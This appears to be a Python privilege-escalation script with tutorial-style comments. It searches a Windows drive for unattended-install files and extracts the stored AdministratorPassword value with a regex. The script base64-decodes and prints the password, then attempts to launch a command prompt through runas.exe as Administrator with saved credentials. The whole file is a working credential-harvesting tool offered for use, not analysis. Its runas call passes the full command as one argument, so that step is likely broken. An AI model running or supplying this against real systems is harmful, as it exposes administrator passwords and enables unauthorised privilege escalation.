#!/usr/bin/python3

# Import os for using useful os classes
import os
import re  # Import the regular expressions module
import base64 # To decode the extracted password
import subprocess # To help running runas.exe

def extract_password(file_path):
    """
    Opens a file, searches for the AdministratorPassword Value tag using regex,
    and returns the matched value if found.
    """
    # Regex pattern to capture the value inside <AdministratorPassword> <Value>...</Value>
    # Supporting potential spaces or newlines (\s*) between the tags
    pattern = r'<AdministratorPassword>\s*<Value>(.*?)</Value>'

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            match = re.search(pattern, content, re.DOTALL)
            if match:
                # contains the string inside the (.*?) parentheses
                return match.group(1).strip()
    except Exception as e:
        # Handle cases where files are locked, unreadable, or permission is denied
        print(f" [!] Could not read {file_path}: {e}")

    return None


# Lets first find the files passed in fun main.
# Also let's pass two arguments to this function to determine targets, and starting directory. Add 2 '\\' instead of 1, because it escapes the next character.
def find_files(targets, base_dir=""):
    # Create an empty list to add target files
    targets_found = list()
    # os.walk gives the result in 3 pieces, the starting root dir, found folders and subfolders, and files inside:
    print(f'Starting search for {targets}...\n')
    for root, dirs, files in os.walk(base_dir):
        # Now we iterate 1 file through all files to see if we hit a target
        for file in files:
            if file in targets:
                # we show a complete path of the file
                path = os.path.join(root, file)
                print(f'[+] Found file: {file} in {path}')
                # Now let's append all the found files to a list we created
                targets_found.append(file)
                # nINTEGRATION; Call the extraction function on the found file(s)
                extracted_val = extract_password(path)
                if extracted_val:
                    print(f'[*] Extracted Password: {extracted_val}')
                    
                    # Clean up and normalize padding before attempting to decode
                    clean_val = extracted_val.strip()
                    missing_padding = len(clean_val) % 4
                    if missing_padding:
                        clean_val += '=' * (4 - missing_padding)
                    
                    try:
                        ascii_string = base64.b64decode(clean_val).decode('utf-8')
                        print(f'[+] Extracted Password: {ascii_string}')
                        subprocess.run(["runas.exe /user:Administrator /savecred cmd.exe"])
                    except Exception as decode_error:
                        # Fallback if the data is already plain text or not valid base64
                        print(f'[!] Base64 decode failed (Value may be plain text): {extracted_val}')
                else:
                    print(f'[-] No matching password tags found in this file.')

    print("\n[!] File search is complete")

    # Create a list of missed targets
    missed_targets = set(targets) - set(targets_found)

    # Print the missing targets if missed_targets list is not empty.
    if missed_targets:
        print(f' [-] Target(s) not found: {list(missed_targets)}')
        print(f'\n[?] Are you sure you typed them correctly?')


# Now, let's pass the arguments, like the target files we look for.
if __name__ == '__main__':
    target_files = ["sysprep.inf", "autounattend.xml", "Unattend.xml"]
    find_files(targets=target_files, base_dir="C:\\")
    
    # Keeps the window open if executed by double-clicking
    input("\nPress Enter to exit...")
